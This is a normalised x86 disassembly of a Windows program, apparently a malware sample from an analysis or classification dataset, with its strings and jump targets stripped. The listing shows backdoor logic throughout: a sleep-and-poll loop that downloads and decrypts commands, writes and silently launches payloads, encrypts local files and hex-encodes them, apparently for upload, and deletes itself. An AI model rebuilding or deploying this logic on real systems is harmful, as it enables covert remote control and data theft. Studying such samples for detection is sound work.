sub_401000
push ebp
mov ebp esp
sub esp 0x90
mov [ ebp - 0x88 ] 0x88
push 0x0
lea eax [ ebp - 0x88 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call LZOpenFileA
mov [ ebp - 0x90 ] eax
push 0x1001
lea edx [ ebp - 0x88 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call LZOpenFileA
mov [ ebp - 0x8c ] eax
mov ecx [ ebp - 0x8c ]
push ecx
mov edx [ ebp - 0x90 ]
push edx
call LZCopy
mov eax [ ebp - 0x90 ]
push eax
call LZClose
mov ecx [ ebp - 0x8c ]
push ecx
call LZClose
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_401077
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x1c ] 0x1
push rw-data
mov eax [ ebp + 0x8 ]
push eax
call [ fopen@IAT ]
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push rw-data
mov ecx [ ebp + 0xc ]
push ecx
call [ fopen@IAT ]
add esp 0x8
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0x3e8
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
push eax
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
push 0x1
mov eax [ ebp - 0xc ]
push eax
call [ fread@IAT ]
add esp 0x10
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
and edx 0x20
test edx edx
je r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
and eax 0x10
push eax
push 0x0
mov ecx [ rw-data ]
push ecx
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
call [ fclose@IAT ]
add esp 0x4
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
push ecx
call [ fwrite@IAT ]
add esp 0x10
mov edx [ ebp - 0x18 ]
mov eax [ edx + 0xc ]
and eax 0x20
test eax eax
je r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
call [ fclose@IAT ]
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
and edx 0x10
test edx edx
je r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
push edx
call [ free@IAT ]
add esp 0x4
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40121e
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jge r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
cmp eax 0x30
jl r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
cmp eax 0x61
jl r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx ]
cmp edx 0x39
jg r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
sub eax 0x37
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx ]
cmp edx 0x7a
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x30
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
cmp eax 0x61
jl r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx ]
cmp edx 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x57
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
cmp eax 0x30
jl r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
sub eax 0x37
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx ]
cmp edx 0x7a
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x30
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax ]
sub ecx 0x57
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
shl ecx 0x4
or ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cdq
sub eax edx
sar eax 0x1
mov edx [ ebp + 0xc ]
mov [ edx + eax ] cl
jmp r-xdata
sub_40134b
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push eax
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
lea edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1
push 0x0
mov ecx [ rw-data ]
push ecx
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4013c1
push ebp
mov ebp esp
push ecx
push 0x0
push 0x12
push rw-data
push 0x0
push rw-data
call [ CryptAcquireContextA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
push 0x8003
mov ecx [ rw-data ]
push ecx
call [ CryptCreateHash@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call strlen
add esp 0x4
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call [ CryptHashData@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x8
push 0x12
push rw-data
push 0x0
push rw-data
call [ CryptAcquireContextA@IAT ]
test eax eax
jne r-xdata
push rw-data
push __dos_header
mov edx [ ebp - 0x4 ]
push edx
push 0x6601
mov eax [ rw-data ]
push eax
call [ CryptDeriveKey@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
mov ecx [ ebp - 0x4 ]
push ecx
call [ CryptDestroyHash@IAT ]
sub_40149d
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
add eax 0x10
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
push 0x0
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call [ CryptEncrypt@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx ] edx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40151f
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jge r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
sar eax 0x4
and eax 0xf
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x9
jle r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x30
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov [ eax + edx * 2 ] cl
mov ecx [ ebp - 0x8 ]
add ecx 0x37
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov [ eax + edx * 2 ] cl
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x30
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ edx + ecx * 2 + 0x1 ] al
mov eax [ ebp - 0x8 ]
add eax 0x37
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ edx + ecx * 2 + 0x1 ] al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx ]
and edx 0xf
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x9
jle r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_4015c0
push ebp
mov ebp esp
sub esp 0x8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push sub_4015fc
push 0x0
push 0x0
call [ _beginthreadex@IAT ]
add esp 0x18
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
call [ CloseHandle@IAT ]
sub_4015fc
push ebp
mov ebp esp
sub esp 0xc
push rw-data
push rw-data
call strcpy
add esp 0x8
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
call sub_401725
add esp 0x8
test eax eax
je r-xdata
call sub_4023a3
test eax eax
jne r-xdata
mov [ rw-data ] 0x927c0
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call sub_4016a6
add esp 0x8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov [ rw-data ] 0x927c0
mov edx [ ebp - 0xc ]
push edx
call sub_4019f8
add esp 0x4
mov eax [ ebp - 0xc ]
push eax
call [ free@IAT ]
add esp 0x4
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
sub_4016a6
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
cdq
sub eax edx
sar eax 0x1
push eax
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40121e
add esp 0xc
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
mov eax [ ebp + 0xc ]
cdq
sub eax edx
sar eax 0x1
push eax
mov edx [ ebp - 0x4 ]
push edx
call sub_40134b
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push eax
call [ free@IAT ]
add esp 0x4
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_401725
push ebp
mov ebp esp
sub esp 0x124
push esi
push edi
mov [ ebp - 0x108 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x107 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x108 ]
push eax
push rw-data
push 0x0
call [ rw-data ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push rw-data
lea ecx [ ebp - 0x108 ]
push ecx
call [ fopen@IAT ]
add esp 0x8
mov [ ebp - 0x10c ] eax
cmp [ ebp - 0x10c ] 0x0
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x2
push 0x0
mov eax [ ebp - 0x10c ]
push eax
call [ fseek@IAT ]
add esp 0xc
mov ecx [ ebp - 0x10c ]
push ecx
call [ ftell@IAT ]
add esp 0x4
mov [ ebp - 0x110 ] eax
push 0x0
push 0x0
mov edx [ ebp - 0x10c ]
push edx
call [ fseek@IAT ]
add esp 0xc
mov eax [ ebp - 0x110 ]
add eax 0x1
push eax
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x0
jne r-xdata
lea edx [ ebp - 0x108 ]
push edx
call [ DeleteFileA@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x110 ]
add ecx 0x1
push ecx
push 0x0
mov edx [ ebp - 0x114 ]
push edx
call memset
add esp 0xc
mov eax [ ebp - 0x10c ]
push eax
mov ecx [ ebp - 0x110 ]
push ecx
push 0x1
mov edx [ ebp - 0x114 ]
push edx
call [ fread@IAT ]
add esp 0x10
cmp eax [ ebp - 0x110 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10c ]
push eax
call [ fclose@IAT ]
add esp 0x4
lea ecx [ ebp - 0x108 ]
push ecx
call [ DeleteFileA@IAT ]
push rw-data
mov edx [ ebp - 0x114 ]
push edx
call [ strstr@IAT ]
add esp 0x8
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0x124 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10c ]
push eax
call [ fclose@IAT ]
add esp 0x4
lea ecx [ ebp - 0x108 ]
push ecx
call [ DeleteFileA@IAT ]
mov edx [ ebp - 0x114 ]
push edx
call [ free@IAT ]
add esp 0x4
xor eax eax
jmp r-xdata
push rw-data
mov ecx [ ebp - 0x124 ]
push ecx
call [ strstr@IAT ]
add esp 0x8
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x118 ] 0x0
jne r-xdata
mov eax [ ebp - 0x114 ]
push eax
call [ free@IAT ]
add esp 0x4
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x124 ]
push eax
call strlen
add esp 0x4
mov esi eax
mov ecx [ ebp - 0x118 ]
push ecx
call strlen
add esp 0x4
sub esi eax
push rw-data
call strlen
add esp 0x4
sub esi eax
mov [ ebp - 0x120 ] esi
mov edx [ ebp - 0x120 ]
add edx 0x1
push edx
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x11c ] eax
mov eax [ ebp - 0x120 ]
add eax 0x1
push eax
push 0x0
mov ecx [ ebp - 0x11c ]
push ecx
call memset
add esp 0xc
mov edx [ ebp - 0x120 ]
push edx
push rw-data
call strlen
add esp 0x4
mov ecx [ ebp - 0x124 ]
add ecx eax
push ecx
mov edx [ ebp - 0x11c ]
push edx
call memcpy
add esp 0xc
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x120 ]
mov [ eax ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x11c ]
mov [ edx ] eax
mov ecx [ ebp - 0x114 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x114 ]
push edx
call [ free@IAT ]
add esp 0x4
xor eax eax
jmp r-xdata
sub_4019f8
push ebp
mov ebp esp
sub esp 0x14
mov [ rw-data ] 0x927c0
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x14 ] 0x76200461
ja r-xdata
cmp [ ebp - 0x14 ] 0x87360121
je r-xdata
cmp [ ebp - 0x14 ] 0x76200461
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
push ecx
call sub_401d4f
add esp 0x4
jmp r-xdata
call sub_401b38
cmp [ ebp - 0x14 ] 0x15420625
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
imul edx edx 0xea60
mov [ rw-data ] edx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x43753159
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
push ecx
call strlen
add esp 0x4
mov edx [ ebp + 0x8 ]
lea eax [ edx + eax + 0x5 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call sub_401b4a
add esp 0x8
jmp r-xdata
jmp r-xdata
sub_401ab2
push ebp
mov ebp esp
sub esp 0x204
push edi
mov [ ebp - 0x204 ] 0x0
mov ecx 0x7f
xor eax eax
lea edi [ ebp - 0x203 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x4 ] rw-data
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x204 ]
push ecx
call strcpy
add esp 0x8
push 0x104
mov edx [ ebp - 0x4 ]
push edx
call strlen
add esp 0x4
lea eax [ ebp + eax - 0x204 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push rw-data
lea ecx [ ebp - 0x204 ]
push ecx
call strcat
add esp 0x8
push 0x0
lea edx [ ebp - 0x204 ]
push edx
call [ WinExec@IAT ]
pop edi
mov esp ebp
pop ebp
retn
sub_401b4a
push ebp
mov ebp esp
sub esp 0x36c
push edi
mov [ ebp - 0x214 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x213 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x318 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x317 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x104 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x103 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call strcpy
add esp 0x8
mov ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x104 ]
push edx
call strcat
add esp 0x8
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x10c ] eax
cmp [ ebp - 0x10c ] 0x0
jne r-xdata
push rw-data
mov eax [ ebp - 0x10c ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x110 ] eax
cmp [ ebp - 0x110 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
push 0x0
push 0x104
lea ecx [ ebp - 0x214 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push 0x0
call [ ebp - 0x110 ]
mov [ ebp - 0x108 ] eax
cmp [ ebp - 0x108 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
xor eax eax
lea eax [ ebp - 0x214 ]
push eax
lea ecx [ ebp - 0x318 ]
push ecx
call strcpy
add esp 0x8
push rw-data
lea edx [ ebp - 0x318 ]
push edx
call strcat
add esp 0x8
lea eax [ ebp - 0x318 ]
push eax
lea ecx [ ebp - 0x214 ]
push ecx
call sub_401077
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebp - 0x214 ]
push eax
call [ DeleteFileA@IAT ]
lea ecx [ ebp - 0x104 ]
push ecx
lea edx [ ebp - 0x318 ]
push edx
call sub_401000
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x214 ]
push edx
call [ DeleteFileA@IAT ]
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x318 ]
push ecx
call [ DeleteFileA@IAT ]
push 0x10
push 0x0
lea edx [ ebp - 0x328 ]
push edx
call memset
add esp 0xc
mov [ ebp - 0x36c ] 0x44
mov ecx 0x10
xor eax eax
lea edi [ ebp - 0x368 ]
[ edi ]
mov [ ebp - 0x340 ] 0x1
mov [ ebp - 0x33c ] 0x0
lea eax [ ebp - 0x328 ]
push eax
lea ecx [ ebp - 0x36c ]
push ecx
push 0x0
push 0x0
push 0x8000000
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x104 ]
push edx
push 0x0
call [ CreateProcessA@IAT ]
jmp r-xdata
lea eax [ ebp - 0x318 ]
push eax
call [ DeleteFileA@IAT ]
xor eax eax
jmp r-xdata
sub_401d4f
push ebp
mov ebp esp
sub esp 0x104
push edi
mov [ ebp - 0x104 ] 0x4
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x103 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
call [ GetTickCount@IAT ]
push eax
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ sprintf@IAT ]
add esp 0xc
lea ecx [ ebp - 0x104 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4024a2
add esp 0x8
test eax eax
je r-xdata
push 0x0
call sub_401dcc
add esp 0x4
xor eax eax
lea eax [ ebp - 0x104 ]
push eax
call sub_401dcc
add esp 0x4
mov eax 0x1
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
sub_401dcc
push ebp
mov ebp esp
sub esp 0x32c
push edi
mov [ ebp - 0x31c ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x31b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x214 ] 0x0
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x213 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push rw-data
mov edx [ ebp + 0x8 ]
push edx
call [ fopen@IAT ]
add esp 0x8
mov [ ebp - 0x32c ] eax
cmp [ ebp - 0x32c ] 0x0
jne r-xdata
push 0x100
push 0x0
lea eax [ ebp - 0x214 ]
push eax
call memset
add esp 0xc
push rw-data
lea ecx [ ebp - 0x214 ]
push ecx
call strcpy
add esp 0x8
push rw-data
lea edx [ ebp - 0x214 ]
push edx
call strcat
add esp 0x8
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x31c ]
push eax
lea ecx [ ebp - 0x214 ]
push ecx
push 0x0
call [ rw-data ]
xor eax eax
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x2
push 0x0
mov edx [ ebp - 0x32c ]
push edx
call [ fseek@IAT ]
add esp 0xc
mov eax [ ebp - 0x32c ]
push eax
call [ ftell@IAT ]
add esp 0x4
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
mov ecx [ ebp - 0x32c ]
push ecx
call [ fseek@IAT ]
add esp 0xc
mov edx [ ebp - 0x4 ]
add edx 0x1
push edx
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x0
jne r-xdata
push 0x100
push 0x0
lea eax [ ebp - 0x214 ]
push eax
call memset
add esp 0xc
push rw-data
lea ecx [ ebp - 0x214 ]
push ecx
call strcpy
add esp 0x8
push rw-data
lea edx [ ebp - 0x214 ]
push edx
call strcat
add esp 0x8
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x31c ]
push eax
lea ecx [ ebp - 0x214 ]
push ecx
push 0x0
call [ rw-data ]
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
push edx
push 0x0
mov eax [ ebp - 0x114 ]
push eax
call memset
add esp 0xc
mov ecx [ ebp - 0x32c ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
push 0x1
mov eax [ ebp - 0x114 ]
push eax
call [ fread@IAT ]
add esp 0x10
mov ecx [ ebp - 0x32c ]
push ecx
call [ fclose@IAT ]
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x324 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x114 ]
push eax
call sub_40149d
add esp 0x10
test eax eax
jne r-xdata
push 0x100
push 0x0
lea eax [ ebp - 0x214 ]
push eax
call memset
add esp 0xc
push rw-data
lea ecx [ ebp - 0x214 ]
push ecx
call strcpy
add esp 0x8
push rw-data
lea edx [ ebp - 0x214 ]
push edx
call strcat
add esp 0x8
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x31c ]
push eax
lea ecx [ ebp - 0x214 ]
push ecx
push 0x0
call [ rw-data ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x110 ]
lea ecx [ eax + eax + 0x1 ]
mov [ ebp - 0x328 ] ecx
mov edx [ ebp - 0x328 ]
push edx
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x218 ] eax
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
push 0x100
push 0x0
lea ecx [ ebp - 0x214 ]
push ecx
call memset
add esp 0xc
push rw-data
lea edx [ ebp - 0x214 ]
push edx
call strcpy
add esp 0x8
push rw-data
lea eax [ ebp - 0x214 ]
push eax
call strcat
add esp 0x8
push 0x0
push 0x0
push 0x104
lea ecx [ ebp - 0x31c ]
push ecx
lea edx [ ebp - 0x214 ]
push edx
push 0x0
call [ rw-data ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x328 ]
push eax
push 0x0
mov ecx [ ebp - 0x218 ]
push ecx
call memset
add esp 0xc
mov edx [ ebp - 0x110 ]
push edx
mov eax [ ebp - 0x218 ]
push eax
mov ecx [ ebp - 0x324 ]
push ecx
call sub_40151f
add esp 0xc
mov [ ebp - 0x320 ] 0x1
call [ GetTickCount@IAT ]
mov [ ebp - 0x10c ] eax
mov edx [ ebp - 0x320 ]
push edx
mov eax [ ebp - 0x110 ]
cdq
idiv [ ebp - 0x328 ]
add eax 0x1
push eax
mov eax [ ebp - 0x10c ]
push eax
push rw-data
push rw-data
lea ecx [ ebp - 0x214 ]
push ecx
call [ sprintf@IAT ]
add esp 0x18
lea edx [ ebp - 0x214 ]
push edx
call strlen
add esp 0x4
mov ecx 0xfa
sub ecx eax
mov [ ebp - 0x328 ] ecx
mov edx [ ebp - 0x218 ]
push edx
call strlen
add esp 0x4
mov [ ebp - 0x110 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x108 ] 0x0
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x107 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x100
push 0x0
lea eax [ ebp - 0x214 ]
push eax
call memset
add esp 0xc
push rw-data
lea ecx [ ebp - 0x214 ]
push ecx
call strcpy
add esp 0x8
push rw-data
lea edx [ ebp - 0x214 ]
push edx
call strcat
add esp 0x8
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x31c ]
push eax
lea ecx [ ebp - 0x214 ]
push ecx
push 0x0
call [ rw-data ]
mov edx [ ebp - 0x324 ]
push edx
call [ free@IAT ]
add esp 0x4
xor eax eax
jmp r-xdata
mov eax 0x1
mov ecx [ ebp - 0x320 ]
push ecx
mov eax [ ebp - 0x110 ]
cdq
